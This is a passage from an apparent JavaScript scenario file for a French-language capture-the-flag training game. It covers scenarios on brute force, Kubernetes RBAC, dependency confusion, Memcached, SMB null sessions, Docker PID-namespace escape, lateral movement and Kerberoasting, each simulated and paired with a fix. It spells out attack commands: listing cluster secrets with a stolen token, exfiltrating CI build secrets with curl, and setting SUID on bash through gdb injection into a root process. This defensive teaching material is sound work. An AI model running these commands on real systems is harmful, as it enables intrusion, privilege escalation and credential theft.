      "Sans limitation de débit, rien n'interrompt la série de tentatives avant qu'un mot de passe corresponde.",
      "Une fois un mot de passe trouvé par la commande précédente, connectez-vous avec : `curl -u admin:Summer2024! http://api.target-lab/admin`"
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
    desc:"Activez une limitation de débit sur l'authentification, pour bloquer les tentatives répétées sans gêner un utilisateur légitime qui se trompe occasionnellement.",
    hints:[
      "Éditez `/etc/api/login-config.yml` avec `nano` et passez `rate_limit_enabled` à `true`.",
      "`verify` confirme que la limitation de débit est désormais active sur l'authentification."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['eve']},
      '/home/eve':{type:'dir',perm:'755',owner:'eve',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['login-config.yml']},
      '/etc/api/login-config.yml':{type:'file',perm:'644',owner:'root',size:40,
        content:"rate_limit_enabled: false\nmax_attempts: 0\n"}
    };
  },
  startUserAttack:'eve', startCwdAttack:'/home/eve',
  exploitRules:[
    { pattern:/^curl-bruteforce\s+--user\s+admin\s+--wordlist\s+common-passwords\.txt\s+--target\s+http:\/\/api\.target-lab\/login$/, run(state, print){
        const limited = /rate_limit_enabled:\s*true/.test(state.vfs['/etc/api/login-config.yml'].content);
        if(limited){
          print('429 Too Many Requests: compte verrouillé après 5 tentatives échouées.', 'err');
          return;
        }
        state.flags = state.flags || {};
        state.flags.crackedPassword = true;
        print('[+] Mot de passe trouvé après 1847 tentatives : admin:Summer2024!', 'ok');
      }
    },
    { pattern:/^curl\s+-u\s+admin:Summer2024!\s+http:\/\/api\.target-lab\/admin$/, run(state, print){
        if(!state.flags || !state.flags.crackedPassword){
          print('401 Unauthorized: identifiants invalides.', 'err');
          return;
        }
        state.flags.adminAccess = true;
        print('{"panel":"admin","users":142,"pending_invoices":37}', 'out');
        print("[+] Accès administrateur obtenu par force brute, faute de limitation de débit.", 'ok');
        print("FLAG{missing_rate_limit_bruteforce_admin}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
  defenseCheck(state){ return /rate_limit_enabled:\s*true/.test(state.vfs['/etc/api/login-config.yml'].content); },
  replay(state){
    const log=[];
    const limited = /rate_limit_enabled:\s*true/.test(state.vfs['/etc/api/login-config.yml'].content);
    log.push({t:"$ curl-bruteforce --user admin --wordlist common-passwords.txt --target http://api.target-lab/login", cls:'prompt-line'});
    if(limited){
      log.push({t:'429 Too Many Requests: compte verrouillé après 5 tentatives échouées.', cls:'err'});
      log.push({t:"[-] La limitation de débit est désormais active : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[+] Mot de passe trouvé par force brute : admin:Summer2024!', cls:'ok'});
    log.push({t:"[+] Accès administrateur obtenu par force brute.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 44. RBAC Kubernetes trop permissif ===================== */
{
  id:'k8s-rbac-clusterrolebinding-overpermissive',
  title:'Un ClusterRoleBinding accorde cluster-admin au compte de service par défaut d\'un namespace',
  category:'Conteneurs & orchestration (RBAC Kubernetes trop permissif)',
  attack:{
    who:'Vous incarnez bob, ayant compromis un pod applicatif du namespace "web" via une autre faille (hors périmètre de ce scénario).',
    desc:"Le jeton du compte de service par défaut est monté automatiquement dans tous les pods du namespace. Un `ClusterRoleBinding` du cluster lui accorde par erreur le rôle `cluster-admin` au lieu d'un rôle restreint au namespace. Utilisez ce jeton pour lire les secrets de l'ensemble du cluster.",
    hints:[
      "`cat /var/run/secrets/kubernetes.io/serviceaccount/token` récupère le jeton du compte de service monté dans le pod.",
      "Rien ne garantit que ce compte de service ait des droits limités à son propre namespace — testez sa portée réelle plutôt que de la supposer.",
      "`kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get secrets --all-namespaces` liste les secrets de tous les namespaces si le compte dispose bien de `cluster-admin`."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du cluster chargé de corriger la faille.',
    desc:"Remplacez le rôle `cluster-admin` accordé à ce compte de service par un rôle strictement limité à son propre namespace, sans casser le fonctionnement légitime de l'application.",
    hints:[
      "Éditez `/etc/kubernetes/rbac/clusterrolebinding-web.yaml` avec `nano` et remplacez `name: cluster-admin` par `name: view` sous `roleRef`.",
      "`verify` confirme que le compte de service n'est plus lié au rôle `cluster-admin`."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','var']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['kubernetes']},
      '/etc/kubernetes':{type:'dir',perm:'755',owner:'root',children:['rbac']},
      '/etc/kubernetes/rbac':{type:'dir',perm:'755',owner:'root',children:['clusterrolebinding-web.yaml']},
      '/etc/kubernetes/rbac/clusterrolebinding-web.yaml':{type:'file',perm:'644',owner:'root',size:180,
        content:"apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: web-default-binding\nsubjects:\n- kind: ServiceAccount\n  name: default\n  namespace: web\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"},
      '/var':{type:'dir',perm:'755',owner:'root',children:['run']},
      '/var/run':{type:'dir',perm:'755',owner:'root',children:['secrets']},
      '/var/run/secrets':{type:'dir',perm:'755',owner:'root',children:['kubernetes.io']},
      '/var/run/secrets/kubernetes.io':{type:'dir',perm:'755',owner:'root',children:['serviceaccount']},
      '/var/run/secrets/kubernetes.io/serviceaccount':{type:'dir',perm:'755',owner:'root',children:['token']},
      '/var/run/secrets/kubernetes.io/serviceaccount/token':{type:'file',perm:'444',owner:'root',size:120,
        content:"eyJhbGciOiJSUzI1NiJ9.web-default-serviceaccount-token.signature\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^cat\s+\/var\/run\/secrets\/kubernetes\.io\/serviceaccount\/token$/, run(state, print){
        print(state.vfs['/var/run/secrets/kubernetes.io/serviceaccount/token'].content, 'out');
      }
    },
    { pattern:/^kubectl\s+--token=\$\(cat\s+\/var\/run\/secrets\/kubernetes\.io\/serviceaccount\/token\)\s+get\s+secrets\s+--all-namespaces$/, run(state, print){
        const overpermissive = /name:\s*cluster-admin/.test(state.vfs['/etc/kubernetes/rbac/clusterrolebinding-web.yaml'].content);
        if(!overpermissive){
          print("Error from server (Forbidden): secrets is forbidden: User \"system:serviceaccount:web:default\" cannot list resource \"secrets\" cluster-wide", 'err');
          return;
        }
        state.flags = state.flags || {};
        state.flags.secretsListed = true;
        print("NAMESPACE     NAME                   TYPE\nweb           web-db-creds           Opaque\nbilling       billing-stripe-key     Opaque\nkube-system   admin-bootstrap-token  Opaque", 'out');
        print("[+] Secrets de tous les namespaces listés via un compte de service lié à cluster-admin.", 'ok');
        print("FLAG{k8s_rbac_clusterrolebinding_cluster_admin}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.secretsListed === true; },
  defenseCheck(state){ return !/name:\s*cluster-admin/.test(state.vfs['/etc/kubernetes/rbac/clusterrolebinding-web.yaml'].content); },
  replay(state){
    const log=[];
    const overpermissive = /name:\s*cluster-admin/.test(state.vfs['/etc/kubernetes/rbac/clusterrolebinding-web.yaml'].content);
    log.push({t:"$ kubectl --token=$(cat .../token) get secrets --all-namespaces", cls:'prompt-line'});
    if(!overpermissive){
      log.push({t:'Error from server (Forbidden): secrets is forbidden cluster-wide', cls:'err'});
      log.push({t:"[-] Le compte de service n'est plus lié à cluster-admin : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'NAMESPACE     NAME                   TYPE\nweb           web-db-creds           Opaque\n...', cls:'ok'});
    log.push({t:"[+] Secrets de tous les namespaces listés via un RBAC trop permissif.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 45. Confusion de dépendances (dependency confusion) ===================== */
{
  id:'dependency-confusion-pip',
  title:'Confusion de dépendances : un paquet public homonyme détourne le pipeline CI',
  category:"Chaîne d'approvisionnement (dependency confusion)",
  attack:{
    who:'Vous incarnez eve, une attaquante externe ayant identifié le nom d\'un paquet Python interne de target-lab (`internal-billing-utils`) mentionné dans un dépôt public.',
    desc:"La configuration `pip` du pipeline CI interroge à la fois l'index interne de l'entreprise et l'index public PyPI, sans jamais restreindre les paquets internes à l'index interne. Publiez un paquet public portant le même nom avec un numéro de version plus élevé : `pip` privilégiera systématiquement la version la plus haute, tous index confondus.",
    hints:[
      "Vous avez déjà publié un paquet malveillant nommé `internal-billing-utils` en version `4.2.0` sur l'index public — bien au-dessus de la version interne légitime `0.1.3`.",
      "`pip install internal-billing-utils --requirement /opt/ci/requirements.txt` déclenche l'installation par le pipeline CI : `pip` compare les versions disponibles sur tous les index configurés et choisit la plus élevée, sans notion de confiance entre index privé et public.",
      "Si votre paquet public est bien installé à la place du paquet interne, son script d'installation s'exécute avec les privilèges du pipeline CI et peut exfiltrer ses secrets : `curl http://ci.target-lab/build-secrets -H 'X-Injected: true'`"
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'ingénieur plateforme chargé de corriger la faille.',
    desc:"Retirez l'index public de la configuration pip utilisée pour les paquets internes, pour que `pip` ne puisse plus jamais résoudre un nom de paquet interne vers l'index public.",
    hints:[
      "Éditez `/etc/pip.conf` avec `nano` et supprimez entièrement la ligne `extra-index-url = https://pypi.org/simple`.",
      "`verify` confirme que l'index public n'est plus interrogé pour la résolution des paquets."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['eve']},
      '/home/eve':{type:'dir',perm:'755',owner:'eve',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['pip.conf']},
      '/etc/pip.conf':{type:'file',perm:'644',owner:'root',size:100,
        content:"[global]\nindex-url = https://pip.internal.target-lab/simple\nextra-index-url = https://pypi.org/simple\n"}
    };
  },
  startUserAttack:'eve', startCwdAttack:'/home/eve',
  exploitRules:[
    { pattern:/^pip\s+install\s+internal-billing-utils\s+--requirement\s+\/opt\/ci\/requirements\.txt$/, run(state, print){
        const vulnerable = /extra-index-url\s*=\s*https:\/\/pypi\.org\/simple/.test(state.vfs['/etc/pip.conf'].content);
        if(!vulnerable){
          print('Successfully installed internal-billing-utils-0.1.3 (from https://pip.internal.target-lab/simple)', 'out');
          print("[i] Seul l'index interne est interrogé : aucun risque de confusion de nom.", 'info');
          return;
        }
        state.flags = state.flags || {};
        state.flags.malwareExecuted = true;
        print('Successfully installed internal-billing-utils-4.2.0 (from https://pypi.org/simple)', 'out');
        print("[i] La version publique 4.2.0 a été préférée à la version interne 0.1.3 : son script d'installation vient de s'exécuter avec les privilèges du pipeline.", 'info');
      }
    },
    { pattern:/^curl\s+http:\/\/ci\.target-lab\/build-secrets\s+-H\s+'X-Injected:\s+true'$/, run(state, print){
        if(!state.flags || !state.flags.malwareExecuted){
          print('403 Forbidden: requête non authentifiée.', 'err');
          return;
        }
        state.flags.secretsExfiltrated = true;
        print('DEPLOY_TOKEN=dtok_a91fbe22', 'out');
        print("[+] Secret de déploiement du pipeline CI exfiltré via un paquet public homonyme.", 'ok');
        print("FLAG{dependency_confusion_pip_public_index}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.secretsExfiltrated === true; },
  defenseCheck(state){ return !/extra-index-url\s*=\s*https:\/\/pypi\.org\/simple/.test(state.vfs['/etc/pip.conf'].content); },
  replay(state){
    const log=[];
    const vulnerable = /extra-index-url\s*=\s*https:\/\/pypi\.org\/simple/.test(state.vfs['/etc/pip.conf'].content);
    log.push({t:"$ pip install internal-billing-utils --requirement /opt/ci/requirements.txt", cls:'prompt-line'});
    if(!vulnerable){
      log.push({t:'Successfully installed internal-billing-utils-0.1.3 (from https://pip.internal.target-lab/simple)', cls:'err'});
      log.push({t:"[-] L'index public n'est plus interrogé : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'Successfully installed internal-billing-utils-4.2.0 (from https://pypi.org/simple)', cls:'ok'});
    log.push({t:"[+] Secret CI exfiltré via un paquet public homonyme (dependency confusion).", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 46. Memcached accessible sans authentification ===================== */
{
  id:'memcached-unauthenticated',
  title:'Un cache Memcached accessible sans authentification expose un jeton de session',
  category:'Service réseau non authentifié (Memcached)',
  attack:{
    who:'Vous incarnez bob, un utilisateur ayant simplement accès au réseau de target-lab.',
    desc:"Le service Memcached écoute sur toutes les interfaces sans authentification SASL configurée. Les sessions web y sont mises en cache en clair — y compris celle d'un administrateur actuellement connecté.",
    hints:[
      "`memcached-cli -h target-lab get session:admin` interroge directement la clé de cache correspondant à la session administrateur, sans qu'aucune authentification ne soit demandée.",
      "Le jeton de session obtenu peut être rejoué tel quel dans un cookie HTTP contre l'application web : `curl -H 'Cookie: session=sesstoken_9f21ab7ce4d80c3f' http://admin.target-lab/panel`"
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Restreignez Memcached à l'interface locale afin qu'il ne soit plus jamais joignable depuis le réseau.",
    hints:[
      "Éditez `/etc/memcached.conf` avec `nano` et remplacez `-l 0.0.0.0` par `-l 127.0.0.1`.",
      "`verify` confirme que le service n'est plus exposé sur le réseau."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['memcached.conf']},
      '/etc/memcached.conf':{type:'file',perm:'644',owner:'root',size:60,
        content:"-m 64\n-p 11211\n-l 0.0.0.0\n# aucune authentification SASL configurée\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^memcached-cli\s+-h\s+\S+\s+get\s+session:admin$/, run(state, print){
        const exposed = /-l\s+0\.0\.0\.0/.test(state.vfs['/etc/memcached.conf'].content);
        if(!exposed){ print('Connection refused', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.tokenLeaked = true;
        print('VALUE session:admin 0 32\nsesstoken_9f21ab7ce4d80c3f\nEND', 'out');
      }
    },
    { pattern:/^curl\s+-H\s+'Cookie:\s+session=sesstoken_9f21ab7ce4d80c3f'\s+http:\/\/admin\.target-lab\/panel$/, run(state, print){
        if(!state.flags || !state.flags.tokenLeaked){
          print('401 Unauthorized: session invalide ou expirée.', 'err');
          return;
        }
        state.flags.adminAccess = true;
        print('{"panel":"admin","user":"admin"}', 'out');
        print("[+] Session administrateur détournée via un cache Memcached non authentifié.", 'ok');
        print("FLAG{memcached_sans_auth_session_leak}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
  defenseCheck(state){ return !/-l\s+0\.0\.0\.0/.test(state.vfs['/etc/memcached.conf'].content); },
  replay(state){
    const log=[];
    const exposed = /-l\s+0\.0\.0\.0/.test(state.vfs['/etc/memcached.conf'].content);
    log.push({t:"$ memcached-cli -h target-lab get session:admin", cls:'prompt-line'});
    if(!exposed){
      log.push({t:'Connection refused', cls:'err'});
      log.push({t:"[-] Le service n'est plus exposé sur le réseau : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'VALUE session:admin 0 32\nsesstoken_9f21ab7ce4d80c3f\nEND', cls:'ok'});
    log.push({t:"[+] Session administrateur détournée via Memcached non authentifié.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 47. Session nulle SMB ===================== */
{
  id:'smb-null-session',
  title:'Une session nulle SMB permet de lister les partages et d\'en extraire des identifiants',
  category:'Service réseau non authentifié (session nulle SMB)',
  attack:{
    who:'Vous incarnez bob, un utilisateur ayant simplement accès au réseau de target-lab.',
    desc:"Le serveur Samba de target-lab autorise les connexions anonymes (session nulle), permettant de lister ses partages et d'en consulter le contenu sans le moindre identifiant.",
    hints:[
      "`smbclient -L //target-lab -N` liste les partages disponibles sans authentification (l'option `-N` force une session nulle) : un partage `backups` attire l'attention.",
      "`smbclient //target-lab/backups -N -c 'get creds.txt'` télécharge un fichier trouvé dans ce partage vers votre répertoire courant.",
      "`cat creds.txt` révèle son contenu une fois téléchargé."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Interdisez les sessions anonymes sur le serveur Samba, sans casser l'accès des utilisateurs authentifiés légitimes.",
    hints:[
      "Éditez `/etc/samba/smb.conf` avec `nano` et remplacez `restrict anonymous = 0` par `restrict anonymous = 2`.",
      "`verify` confirme que les sessions anonymes sont désormais refusées."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['samba']},
      '/etc/samba':{type:'dir',perm:'755',owner:'root',children:['smb.conf']},
      '/etc/samba/smb.conf':{type:'file',perm:'644',owner:'root',size:70,
        content:"[global]\nmap to guest = Bad User\nrestrict anonymous = 0\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^smbclient\s+-L\s+\/\/target-lab\s+-N$/, run(state, print){
        const open = /restrict anonymous\s*=\s*0/.test(state.vfs['/etc/samba/smb.conf'].content);
        if(!open){ print('NT_STATUS_ACCESS_DENIED listing the server', 'err'); return; }
        print('Sharename       Type      Comment\n---------       ----      -------\nIT$             Disk\nbackups          Disk      Sauvegardes internes', 'out');
      }
    },
    { pattern:/^smbclient\s+\/\/target-lab\/backups\s+-N\s+-c\s+'get\s+creds\.txt'$/, run(state, print){
        const open = /restrict anonymous\s*=\s*0/.test(state.vfs['/etc/samba/smb.conf'].content);
        if(!open){ print('NT_STATUS_ACCESS_DENIED connecting to backups', 'err'); return; }
        state.vfs['/home/bob/creds.txt'] = {type:'file',perm:'644',owner:'bob',size:30,content:"svc_backup:B4ckup2024!\n"};
        state.flags = state.flags || {};
        state.flags.downloaded = true;
        print('getting file \\creds.txt (12.0 KiloBytes/sec)', 'out');
      }
    },
    { pattern:/^cat\s+creds\.txt$/, run(state, print){
        if(!state.flags || !state.flags.downloaded){
          print('cat: creds.txt: No such file or directory', 'err');
          return;
        }
        state.flags.crackedCreds = true;
        print(state.vfs['/home/bob/creds.txt'].content, 'out');
        print("[+] Identifiants d'un compte de service extraits d'un partage SMB accessible en session nulle.", 'ok');
        print("FLAG{smb_null_session_backups_creds}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.crackedCreds === true; },
  defenseCheck(state){ return !/restrict anonymous\s*=\s*0/.test(state.vfs['/etc/samba/smb.conf'].content); },
  replay(state){
    const log=[];
    const open = /restrict anonymous\s*=\s*0/.test(state.vfs['/etc/samba/smb.conf'].content);
    log.push({t:"$ smbclient -L //target-lab -N", cls:'prompt-line'});
    if(!open){
      log.push({t:'NT_STATUS_ACCESS_DENIED listing the server', cls:'err'});
      log.push({t:"[-] Les sessions anonymes sont désormais refusées : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'Sharename       Type\nIT$             Disk\nbackups          Disk', cls:'ok'});
    log.push({t:"[+] Identifiants extraits d'un partage SMB via session nulle.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 48. Espace de noms PID partagé avec l'hôte ===================== */
{
  id:'docker-pid-host-ptrace-injection',
  title:'Un conteneur en espace de noms PID partagé avec l\'hôte permet l\'injection de code',
  category:'Évasion de conteneur (PID host partagé + SYS_PTRACE)',
  attack:{
    who:'Vous incarnez bob, disposant d\'un accès limité au démon Docker de target-lab (via un pipeline CI, par exemple).',
    desc:"Rien n'empêche de lancer un conteneur partageant l'espace de noms PID de l'hôte avec la capacité SYS_PTRACE. Depuis ce conteneur, tous les processus de l'hôte deviennent visibles et injectables — y compris ceux qui tournent en root.",
    hints:[
      "`docker run -d --pid=host --cap-add=SYS_PTRACE --name pwn debian sleep 3600` lance un conteneur partageant l'espace de noms PID de l'hôte, avec la capacité de tracer n'importe quel processus.",
      "`docker exec pwn ps aux` liste alors les processus de l'hôte lui-même, pas seulement ceux du conteneur — un agent de sauvegarde tournant en root (`backup-agent`, PID 4821) apparaît dans la liste.",
      "`docker exec pwn gdb -p 4821 -batch -ex 'call system(\"chmod u+s /bin/bash\")'` attache un débogueur à ce processus root de l'hôte et lui fait exécuter une commande arbitraire avec ses privilèges."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
    desc:"Interdisez le partage de l'espace de noms PID de l'hôte au niveau de la politique du démon Docker, sans bloquer les conteneurs isolés légitimes.",
    hints:[
      "Éditez `/etc/docker/daemon-policy.yml` avec `nano` et passez `allow-shared-pid-namespace` à `false`.",
      "`verify` confirme que le partage de l'espace de noms PID de l'hôte est désormais interdit."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['docker']},
      '/etc/docker':{type:'dir',perm:'755',owner:'root',children:['daemon-policy.yml']},
      '/etc/docker/daemon-policy.yml':{type:'file',perm:'644',owner:'root',size:50,
        content:"allow-shared-pid-namespace: true\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^docker\s+run\s+-d\s+--pid=host\s+--cap-add=SYS_PTRACE\s+--name\s+pwn\s+debian\s+sleep\s+3600$/, run(state, print){
        const allowed = /allow-shared-pid-namespace:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content);
        if(!allowed){ print('docker: Error response from daemon: espace de noms PID hôte refusé par la politique.', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.containerLaunched = true;
        print('a1f3c9e02b7d', 'out');
      }
    },
    { pattern:/^docker\s+exec\s+pwn\s+ps\s+aux$/, run(state, print){
        if(!state.flags || !state.flags.containerLaunched){ print('Error: No such container: pwn', 'err'); return; }
        state.flags.hostPidVisible = true;
        print('USER   PID  COMMAND\nroot   1    /sbin/init\nroot   4821 /usr/sbin/backup-agent --daemon\nbob    5190 sleep 3600', 'out');
        print("[i] Des processus de l'hôte (PID 4821, root) sont visibles depuis le conteneur : l'espace de noms PID est bien partagé.", 'info');
      }
    },
    { pattern:/^docker\s+exec\s+pwn\s+gdb\s+-p\s+4821\s+-batch\s+-ex\s+'call\s+system\("chmod\s+u\+s\s+\/bin\/bash"\)'$/, run(state, print){
        if(!state.flags || !state.flags.hostPidVisible){ print('gdb: no process 4821', 'err'); return; }
        state.flags.suidSet = true;
        print("Attaching to process 4821\n$1 = 0\n[Inferior 1 (process 4821) detached]", 'out');
        print("[+] Bit SUID posé sur /bin/bash de l'hôte via injection dans un processus root visible grâce au PID namespace partagé.", 'ok');
        print("FLAG{docker_pid_host_ptrace_process_injection}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.suidSet === true; },
  defenseCheck(state){ return !/allow-shared-pid-namespace:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content); },
  replay(state){
    const log=[];
    const allowed = /allow-shared-pid-namespace:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content);
    log.push({t:"$ docker run -d --pid=host --cap-add=SYS_PTRACE --name pwn debian sleep 3600", cls:'prompt-line'});
    if(!allowed){
      log.push({t:'docker: Error response from daemon: espace de noms PID hôte refusé par la politique.', cls:'err'});
      log.push({t:"[-] Le partage du PID namespace hôte est désormais interdit : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'a1f3c9e02b7d', cls:'ok'});
    log.push({t:"[+] Bit SUID posé sur /bin/bash de l'hôte via injection de processus.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 49. Absence de NetworkPolicy Kubernetes ===================== */
{
  id:'k8s-missing-networkpolicy-lateral-movement',
  title:'L\'absence de NetworkPolicy permet un mouvement latéral entre namespaces Kubernetes',
  category:'Conteneurs & orchestration (NetworkPolicy absente)',
  attack:{
    who:'Vous incarnez bob, ayant compromis un pod à faible privilège dans le namespace "public-web" via une autre faille (hors périmètre de ce scénario).',
    desc:"Aucune NetworkPolicy ne restreint le trafic sortant du namespace \"public-web\" : depuis ce pod, rien n'empêche d'atteindre directement un service interne du namespace \"billing\", pourtant censé rester inaccessible depuis l'extérieur.",
    hints:[
      "`curl http://billing-internal.billing.svc.cluster.local/api/accounts` interroge directement un service d'un autre namespace, en utilisant la résolution DNS interne du cluster — rien n'indique que ce trafic devrait être bloqué.",
      "Si aucune politique réseau ne l'empêche, ce service interne répond sans poser de question, exposant une piste vers un jeton d'administration.",
      "`curl http://billing-internal.billing.svc.cluster.local/api/accounts/admin/token` récupère ce jeton s'il a bien été révélé à l'étape précédente."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du cluster chargé de corriger la faille.',
    desc:"Activez la politique réseau qui isole le namespace \"public-web\" du reste du cluster, sans bloquer son trafic sortant légitime vers Internet.",
    hints:[
      "Éditez `/etc/kubernetes/networkpolicy/public-web-egress.yaml` avec `nano` et passez `enabled` à `true`.",
      "`verify` confirme que la politique d'isolement réseau est désormais active."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['kubernetes']},
      '/etc/kubernetes':{type:'dir',perm:'755',owner:'root',children:['networkpolicy']},
      '/etc/kubernetes/networkpolicy':{type:'dir',perm:'755',owner:'root',children:['public-web-egress.yaml']},
      '/etc/kubernetes/networkpolicy/public-web-egress.yaml':{type:'file',perm:'644',owner:'root',size:160,
        content:"# enabled: false\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: public-web-egress\n  namespace: public-web\nspec:\n  policyTypes: [Egress]\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/billing-internal\.billing\.svc\.cluster\.local\/api\/accounts$/, run(state, print){
        const enabled = /#\s*enabled:\s*true/.test(state.vfs['/etc/kubernetes/networkpolicy/public-web-egress.yaml'].content);
        if(enabled){ print("curl: (28) Failed to connect to billing-internal.billing.svc.cluster.local port 80: Connection timed out", 'err'); return; }
        state.flags = state.flags || {};
        state.flags.reached = true;
        print('{"accounts":142,"docs":"/api/accounts/admin/token pour le support (usage interne uniquement)"}', 'out');
        print("[i] Le service interne répond alors qu'aucune politique réseau ne devrait autoriser ce trafic depuis public-web.", 'info');
      }
    },
    { pattern:/^curl\s+http:\/\/billing-internal\.billing\.svc\.cluster\.local\/api\/accounts\/admin\/token$/, run(state, print){
        if(!state.flags || !state.flags.reached){
          print("curl: (28) Failed to connect to billing-internal.billing.svc.cluster.local port 80: Connection timed out", 'err');
          return;
        }
        state.flags.tokenObtained = true;
        print('{"token":"billing_admin_a72fe910"}', 'out');
        print("[+] Jeton d'administration du namespace billing obtenu par mouvement latéral, faute de NetworkPolicy.", 'ok');
        print("FLAG{k8s_missing_networkpolicy_lateral_movement}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.tokenObtained === true; },
  defenseCheck(state){ return /#\s*enabled:\s*true/.test(state.vfs['/etc/kubernetes/networkpolicy/public-web-egress.yaml'].content); },
  replay(state){
    const log=[];
    const enabled = /#\s*enabled:\s*true/.test(state.vfs['/etc/kubernetes/networkpolicy/public-web-egress.yaml'].content);
    log.push({t:"$ curl http://billing-internal.billing.svc.cluster.local/api/accounts", cls:'prompt-line'});
    if(enabled){
      log.push({t:'curl: (28) Failed to connect ... Connection timed out', cls:'err'});
      log.push({t:"[-] La politique réseau bloque désormais ce trafic : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'{"accounts":142, ...}', cls:'ok'});
    log.push({t:"[+] Jeton d'administration obtenu par mouvement latéral entre namespaces.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 50. Kerberoasting (Active Directory) ===================== */
{
  id:'ad-kerberoasting-spn',
  title:'Un compte de service à mot de passe faible exposé par son SPN (Kerberoasting)',
  category:'Active Directory (Kerberoasting)',
  attack:{
    who:'Vous incarnez bob, un utilisateur du domaine sans privilège particulier, avec un simple accès réseau au contrôleur de domaine.',
    desc:"Le compte de service `svc-sql` porte un SPN (Service Principal Name) enregistré pour le serveur SQL `sql01`. N'importe quel utilisateur authentifié du domaine peut demander un ticket de service (TGS) pour ce compte, chiffré avec le hash NTLM de son mot de passe — sans jamais avoir besoin d'y accéder directement. Si ce mot de passe est faible, le ticket se casse hors-ligne en quelques minutes.",
    hints:[
      "`Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"}` (interrogation LDAP du domaine) liste les comptes porteurs d'un SPN : `svc-sql` ressort, associé au service `MSSQLSvc/sql01.lab.local:1433`.",
      "`kerberoast svc-sql` demande un ticket de service Kerberos pour ce compte précis et récupère le hash chiffré associé, sans déclencher la moindre alerte d'authentification échouée.",
